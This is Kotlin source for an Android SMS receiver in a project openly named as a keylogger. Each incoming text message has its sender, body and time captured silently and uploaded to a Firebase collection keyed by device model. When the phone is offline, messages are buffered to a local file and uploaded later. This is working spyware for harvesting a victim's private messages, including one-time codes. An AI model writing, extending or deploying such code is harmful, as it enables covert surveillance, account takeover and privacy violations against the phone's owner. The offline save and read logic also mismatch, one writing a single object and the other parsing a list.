package com.azamovhudstc.androidkeylogger.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.util.Log
import androidx.core.content.ContextCompat.getSystemService
import com.azamovhudstc.androidkeylogger.model.SMSData
import com.azamovhudstc.androidkeylogger.service.SmsService
import com.google.firebase.firestore.FirebaseFirestore
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import java.io.File
import java.io.FileOutputStream
import java.io.FileReader
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Locale

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        if (action == "android.provider.Telephony.SMS_RECEIVED") {
            val bundle = intent.extras
            if (bundle != null) {
                val pdus = bundle.get("pdus") as Array<*>
                for (i in pdus.indices) {
                    val smsMessage =
                        android.telephony.SmsMessage.createFromPdu(pdus[i] as ByteArray)
                    val senderPhoneNumber = smsMessage.originatingAddress
                    val messageBody = smsMessage.messageBody
                    val receivedTime = smsMessage.timestampMillis

                    val smsData = SMSData(
                        messageBody ?: "",
                        senderPhoneNumber ?: "",
                        convertMillisToReadableTime(receivedTime)
                    )
                    if (isOnline(context)) {
                        if (isLocalSmsAvailable(context)) {
                            sendAllSmsDataToFirebase(context)
                            saveSmsDataToFirebase(smsData, context)
                        } else {
                            saveSmsDataToFirebase(smsData, context)

                        }
                    } else {
                        saveSmsToFile(context, smsData)
                    }
                }
            }
        }
    }

    private fun saveSmsDataToFirebase(smsData: SMSData, context: Context) {
        val deviceModel = android.os.Build.MODEL
        val collectionReference = FirebaseFirestore.getInstance().collection("sms_$deviceModel")
        collectionReference.add(smsData)
            .addOnSuccessListener { documentReference ->
                Log.d("EVENT", "SMS data sent to Firebase successfully")
            }
            .addOnFailureListener { e ->
                Log.e("EVENT", "Error sending SMS data to Firebase", e)
            }
    }

    private fun isOnline(context: Context): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        return networkInfo != null && networkInfo.isConnected
    }


    private fun isLocalSmsAvailable(context: Context): Boolean {
        val fileName = "sms_log.json"
        val filePath = File(context.getExternalFilesDir(null), fileName)
        return filePath.exists()
    }

    private fun saveSmsToFile(context: Context, smsData: SMSData) {
        val gson = Gson()

        // Convert the list to JSON string
        val jsonString = gson.toJson(smsData)

        val fileName = "sms_log.json"
        val filePath = File(context.getExternalFilesDir(null), fileName)
        val outputStream = FileOutputStream(filePath, false) // Rewrite the file
        outputStream.write(jsonString.toByteArray())
        outputStream.close()
    }

    private fun sendAllSmsDataToFirebase(context: Context) {
        val smsDataList = readSmsFromFile(context)
        val deviceModel = android.os.Build.MODEL
        val collectionReference = FirebaseFirestore.getInstance().collection("sms_$deviceModel")
        for (smsData in smsDataList) {
            collectionReference.add(smsData)
                .addOnSuccessListener { documentReference ->
                    Log.d("EVENT", "SMS data sent to Firebase successfully")
                    // Ma'lumot Firebase ga muvaffaqiyatli yuborilgan, shuning uchun lokal faylni o'chiramiz
                    deleteLocalSmsFile(context)
                }
                .addOnFailureListener { e ->
                    Log.e("EVENT", "Error sending SMS data to Firebase", e)
                }
        }
    }

    private fun deleteLocalSmsFile(context: Context) {
        val fileName = "sms_log.json"
        val filePath = File(context.getExternalFilesDir(null), fileName)
        if (filePath.exists()) {
            filePath.delete()
            Log.d("EVENT", "Local SMS file deleted successfully")
        } else {
            Log.e("EVENT", "Local SMS file not found")
        }
    }

    private fun readSmsFromFile(context: Context): List<SMSData> {
        val gson = Gson()
        val fileName = "sms_log.json"
        val filePath = File(context.getExternalFilesDir(null), fileName)

        if (!filePath.exists()) {
            // If file doesn't exist, return an empty list
            return emptyList()
        }

        val fileReader = FileReader(filePath)
        val typeToken = object : TypeToken<List<SMSData>>() {}.type
        return gson.fromJson(fileReader, typeToken)
    }

    private fun convertMillisToReadableTime(timestamp: Long): String {
        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        val calendar = Calendar.getInstance()
        calendar.timeInMillis = timestamp
        return sdf.format(calendar.time)
    }
}